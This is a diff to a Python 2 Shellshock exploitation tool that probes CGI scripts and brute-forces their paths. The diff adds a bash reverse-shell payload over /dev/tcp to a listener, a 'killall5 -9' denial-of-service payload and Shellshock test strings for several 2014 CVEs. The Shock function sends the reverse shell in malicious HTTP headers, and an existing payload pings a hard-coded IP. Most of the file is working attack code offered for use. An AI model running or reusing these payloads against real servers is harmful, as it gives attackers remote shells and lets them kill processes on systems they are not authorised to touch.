@@ -9,8 +9,10 @@ target_path = ''
 Payload_1 = 'echo \'Sh3llsh0ck3d!\' > exploited.txt'
 Payload_2 = 'cd /usr/local/apache2/htdocs/ && echo \'<html><body><h1>OMG i got Shellshocked!</h1></body></html>\''
 Payload_3 = 'ping 185.143.173.62'
+Payload_4 = 'killall5 -9' # Sort of DOS
+Payload_5 = '/bin/bash -i >& /dev/tcp/%s 0>&1'  # Request to a listener
+Payload_6 = 'sleep 10'
 Expl0it = '() { ignored;};'
-
 
 legit_headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
@@ -29,32 +31,28 @@ def banner():
   ____) | | | |  __/ | \__ \ | | | (_) | (__|   < 
  |_____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_|
                                                     () { :; };
-        checker tool\n
+        Vulnerable CGI checker tool\n
     Created by r4z0r5 for DSEC, 2017
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-
 Usage is so simple even a monkey can handle it:
-Simply input everything the script would ask you for ;)
+Simply input everything the script asks you for ;)
 
-Path to CGI-sctipt is not required if you are using the -b flag
+CVE - 2014 - 6271
+() { :;}; echo Vulnerable
 
-Flags:
+CVE - 2014- 7169
+() { (a)=>\' sh -c "echo date"; cat echo
 
-b  - Brute force the path to CGI scripts. Using this flag also requires You to point a path to the dictionary (flag d),\nif you dont want to use the default one.
-     
-     Example : Shellshocker.py b plsleavemealone.com d Desktop/dicts/somedict.txt
-h  - Check which header is vulnerable. In this mode tool will check multiple headers for the vulnerability.    
-  
-     Example : Shellshocker.py h pwnmepls.io /cgi-bin/vulnerable.cgi
-t  - Simple Shellshock check.
-         
-     Example : Shellshcoker.py t shellshock.me /cgi-bin/shockme.cgi     
-    
+CVE - 2014- 7168
+true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
+echo "Vulnerable to CVE-2014-7186, redir_stack    
+
     '''
     print(banner_text)
     return
+
 
 def Shock(target_host, target_port, target_path, listener):
     reverse_shell = "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % listener
@@ -64,13 +62,12 @@ def Shock(target_host, target_port, target_path, listener):
 
     connection = httplib.HTTPConnection(host=target_host, port=target_port)
 
-
     print '\n[*]Sending out a request with malicious headers.'
     print '\n[*]Request method : GET, Request url = ', target_path, '\nHeaders: ', malicious_headers
     req2 = connection.request("GET", url=target_path, headers=malicious_headers)
     response = connection.getresponse()
     if response.status == 200:
-        print 'Exploitation seems to be successful, check you\'r listener!'
+        print '\nExploitation seems to be successful, check you\'r listener!'
         result = True
     else:
         print 'There might be an error in server handling our malicious request.'
@@ -79,10 +76,10 @@ def Shock(target_host, target_port, target_path, listener):
     return result
 
 
-def Bruteforce_CGIS(target_host,target_port,dictionary_path,legit_headers):
+def Bruteforce_CGIS(target_host, target_port, dictionary_path, legit_headers):
     ### Opening the dict file
     try:
-        open(dictionary_path,'r')
+        open(dictionary_path, 'r')
     except IOError:
         print 'File or directory not found.'
         banner()
@@ -94,19 +91,21 @@ def Bruteforce_CGIS(target_host,target_port,dictionary_path,legit_headers):
         req = con.request("GET", url=target_path, headers=legit_headers)
         response = con.getresponse()
         if response == 200:
-            print '+' * 30, line, response.status,response.reason, '+' * 30
+            print '+' * 30, line, response.status, response.reason, '+' * 30
         if response == 403:
-            print line, response.status,response.reason
+            print line, response.status, response.reason
         if response == 404:
             print line, 'Not Found'
     return result
 
-def Connection_check(target_host,target_port,target_path,legit_headers):
+
+def Connection_check(target_host, target_port, target_path, legit_headers):
     result = False
-    con = httplib.HTTPConnection(host=target_host,port=target_port)
-    req = con.request("GET",url=target_path, headers=legit_headers) ### Socket error number 10061, could be poor net~~~~~
+    con = httplib.HTTPConnection(host=target_host, port=target_port)
+    req = con.request("GET", url=target_path,
+                      headers=legit_headers)
     response = con.getresponse()
-    print response.status,response.reason,response.msg
+    print response.status, response.reason, response.msg
     if response.status == 403:
         print 'Access denied, try different CGI path.'
         time.sleep(5)
@@ -128,12 +127,12 @@ def Connection_check(target_host,target_port,target_path,legit_headers):
     con.close()
     return result
 
+
 """
 
 A C T U A L   B E G I N N I N G
 
 """
-
 
 banner()
 
@@ -142,17 +141,14 @@ test_type = ''
 target_host = raw_input('Target host:')
 
 user_response_0 = raw_input('Do you know the path to target CGI scrip?(Y or N):')
-print user_response_0   
 if 'Y' in user_response_0:
     path_known = True
-elif 'N' in user_response_0:
+else:
     path_known = False
-elif 'Y' or 'N' not in user_response_0:
-    print 'Unknown input! (expected Y or N), input received: ', user_response_0, '\n', type(user_response_0)
-    exit()
+
 if path_known:
     target_path = raw_input('Enter the CGI script path:')
-    print '\nThe CGI path is known, you have 2 test types available:\n1. Simple shellshock test (Flag t)\n2.Vulnerable' \
+    print '\nThe CGI path is known, you have 2 test types available:\n1. Simple shellshock test (Flag t)\n2. Vulnerable' \
           ' header brute-force (Flag b)'
     test_type = raw_input('What test to perform? (t or b):')
     if 't' in test_type:
